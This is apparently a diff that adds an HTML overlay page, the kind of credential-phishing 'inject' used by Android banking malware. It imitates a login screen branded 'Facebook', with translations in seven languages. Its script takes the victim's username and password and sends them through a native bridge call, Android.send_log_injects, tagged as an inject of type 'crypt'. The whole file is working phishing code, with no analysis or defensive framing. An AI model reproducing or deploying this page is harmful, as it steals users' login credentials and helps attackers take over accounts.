@@ -1,0 +1,291 @@
+<!DOCTYPE html> 
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <title>Document</title>
+    <style>
+        
+
+        .input {
+            width: 100%;
+            border: 0;
+            border-bottom: 1px solid #eaeaea;
+            padding: 5px;
+            padding-left: 0;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        .submit {
+            color: #fff;
+            width: 100%;
+            padding: 12px;
+            border: 0;
+            border-radius: 4px;
+            background: #0c6cf2;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        footer {
+            padding: 20px;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left:0;
+            top: 50%;
+            line-height: 1em;
+            color: #afafaf;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: -0.5em;
+            color: #2a2d2f;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section { 
+            flex: 1;
+            padding: 20px;
+        }
+
+        footer {
+            padding: 20px;
+        }
+
+        .button {
+            padding: 10px;
+            background-color: #159e49;
+            color: #fff;
+            border: 0;
+            border-radius: 25px;
+            width: 100%;
+            font-weight: 600;
+        }
+
+        .button:disabled {
+            opacity: 0.1;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABDgAAACUCAMAAABBX2k7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzM0REM1N0NBQzlGMTFFQUFDOURFQjMxMzQ1MTQwMzEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzM0REM1N0RBQzlGMTFFQUFDOURFQjMxMzQ1MTQwMzEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDMzREQzU3QUFDOUYxMUVBQUM5REVCMzEzNDUxNDAzMSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDMzREQzU3QkFDOUYxMUVBQUM5REVCMzEzNDUxNDAzMSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PncOYh8AAADAUExURRWeSSgoJyot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" alt="">
+
+            <p style="text-align: center;font-weight: bold;font-size: 20px;color: #2a2d2f;margin-bottom: 0;">{{t.__text1}}</p>
+            <p style="text-align: center;color: #afafaf;margin-bottom: 0;font-size: 14px;font-weight: 600;">{{t.__text2}}</p>
+            <p style="text-align: center;color: #64afff;margin-bottom: 0;font-size: 14px;font-weight: 600;">{{t.__text3}}</p>
+        </header>
+        <section>
+            <div class="cool-input">
+                <input type="text" name="login" id="login" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">{{t.__text4}}</span>
+            </div>
+            <div class="cool-input">
+                <input type="password" name="password" id="password" style="padding-right: 30px" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">{{t.__text5}}</span>
+            </div>
+            <img id="eye" style="float: right;position: relative;top: -44px;right: 5px;cursor: pointer;z-index: 9999;width: 18px;margin-bottom: -50px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAmCAAAAACadCa7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Q0UyREY1QkRBQzlGMTFFQTk3QUZBQTE1MDY1MjJBMkUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Q0UyREY1QkVBQzlGMTFFQTk3QUZBQTE1MDY1MjJBMkUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDRTJERjVCQkFDOUYxMUVBOTdBRkFBMTUwNjUyMkEyRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDRTJERjVCQ0FDOUYxMUVBOTdBRkFBMTUwNjUyMkEyRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuspzywAAAFiSURBVDjLjZQtu4MwDIX7p48EiWxlkcjZXYnkSiYnmaxFxp4r2rsmHc8gipb3SZOTD0dSxsRL5kgJ6NNVOAIXaUemTtHy/BkDgGEc55d8wpq+w9j4+IAVLd7S6Gdp4G80hmcDf6UxSgP3eNO3NZFpnSodkgmjLxFqBfeKl/ucYHtbbGnunfJ7Sudyo6HFF4VrJCHDqhBakyAk9/pvJh23ep6MgsG6xkbHoR5Xq/dCclVy0ynH2IowhQ5GKGBzozqRpM7yfS6uXTyCC93A0YSRSHqrtw2DUSdY61BolWC00t1YXRf6pt+1Rdl1jzYde8/lrkpP+WlvawkA8KJmMNvy30LtNHS7mcFsv8d0l2rzb5We9gO6S2asVIdMj0S+HpPK0owVKRHHpqfBvb/W4ZSuMGXuTmhn9tPaBBMXvQcbmJRtjnEA4OP8lGZrurM1q+lTWNPncKbjRZipg5erMFPMe/QP+gfo5Rrrud0AAAAASUVORK5CYII=" alt="">
+        
+            <p style="color: #64afff;text-align: right;font-weight: 600;font-size: 14px;margin-top: 40px;">{{t.__text6}}</p>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="{{t.__text7}}">
+        </footer>
+    </form>
+
+    <script>
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            sendData = document.getElementById('sendData'),
+            eye = document.getElementById('eye');
+
+        eye.onclick = () => {
+            if(password.type == 'password') {
+                password.type = 'text'
+            } else {
+                password.type = 'password'
+            }
+        }
+
+        function check() {
+            if(login.value.length > 5 && password.value.length > 0) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        login.onkeyup = () => {
+            check()
+        }
+
+        password.onkeyup = () => {
+            check()
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.type_injects = "crypt";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                en: { 
+                    __text1: "Log in",
+                    __text2: "Don't have an account?",
+                    __text3: "Register now for free",
+                    __text4: "Email or User ID",
+                    __text5: "Password",
+                    __text6: "Forgot password?",
+                    __text7: "Continue",
+                }, 
+        
+                tr: { 
+                    __text1: "Giriş yap",
+                    __text2: "Bir hesabınız yok?",
+                    __text3: "Şimdi ücretsiz kayıt olun",
+                    __text4: "E-posta veya kullanıcı kimliği",
+                    __text5: "Şifre",
+                    __text6: "Şifremi unuttum?",
+                    __text7: "Devam etmek",
+                }, 
+                
+                es: { 
+                    __text1: "Continuar",
+                    __text2: "No tienes una cuenta?",
+                    __text3: "Regístrese ahora gratis",
+                    __text4: "Correo electrónico o ID de usuario",
+                    __text5: "Contraseña",
+                    __text6: "Recuperar contraseña",
+                    __text7: "Continuar",
+                },  
+        
+                fr: { 
+                    __text1: "Connecter",
+                    __text2: "N'avez pas de compte?",
+                    __text3: "Inscrivez-vous gratuitement",
+                    __text4: "E-mail ou ID utilisateur",
+                    __text5: "Mot de passe",
+                    __text6: "Mot de passe oublié?",
+                    __text7: "Continuer",
+                }, 
+        
+                ro: { 
+                    __text1: "Autentificare",
+                    __text2: "Nu aveți un cont?",
+                    __text3: "Inregistreaza-te acum gratuit",
+                    __text4: "E-mail sau ID utilizator",
+                    __text5: "Parola",
+                    __text6: "Ai uitat parola?",
+                    __text7: "Continuă",
+                }, 
+        
+                it: { 
+                    __text1: "Login",
+                    __text2: "Non hai un conto?",
+                    __text3: "Registrati ora gratuitamente",
+                    __text4: "Email o ID utente",
+                    __text5: "Password",
+                    __text6: "Hai dimenticato la password?",
+                    __text7: "Continuare",
+                },  
+        
+                de: { 
+                    __text1: "Anmelden",
+                    __text2: "Haben Sie kein Konto?",
+                    __text3: "Jetzt kostenlos anmelden",
+                    __text4: "E-Mail oder Benutzer-ID",
+                    __text5: "Passwort",
+                    __text6: "Passwort vergessen?",
+                    __text7: "Weiterhin",
+                }, 
+            }
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
